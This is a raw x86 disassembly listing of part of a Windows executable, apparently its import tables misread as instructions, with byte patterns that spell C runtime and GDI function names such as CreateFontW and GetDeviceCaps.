  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
